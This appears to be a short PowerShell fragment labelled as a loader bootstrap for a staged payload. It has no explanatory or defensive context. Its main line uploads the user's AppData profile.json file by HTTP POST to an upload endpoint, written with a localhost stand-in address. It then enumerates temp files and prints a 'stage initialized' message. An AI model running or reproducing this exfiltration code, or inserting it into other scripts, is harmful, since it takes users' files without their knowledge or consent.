
<# Loader bootstrap #> Invoke-WebRequest -Uri "http://127.0.0.1/upload" -Method Post -InFile "$env:APPDATA\profile.json" -ContentType "application/json"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; Write-Output "stage 38 initialized"
